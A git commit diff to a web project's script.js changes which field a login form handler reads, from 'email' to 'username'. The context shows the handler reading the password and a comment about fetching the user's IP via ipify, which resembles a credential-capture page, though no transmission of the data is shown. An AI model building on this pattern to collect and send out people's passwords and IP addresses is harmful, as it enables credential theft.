b00c09877271c13aa2e3b98c2a882f4d265d33ef
randomstuff69 <132950785+randomstuff69@users.noreply.github.com>
2024-11-25 20:47:25 -0700

    Update script.js

--- script.js
+++ script.js
@@ -15,7 +15,7 @@ skibidiCheckbox.addEventListener('change', function() {
 
 document.getElementById('loginForm').addEventListener('submit', function(e) {
     e.preventDefault();
-    const email = document.getElementById('email').value;
+    const email = document.getElementById('username').value;
     const password = document.getElementById('password').value;
 
     // Fetch the user's IP address using ipify
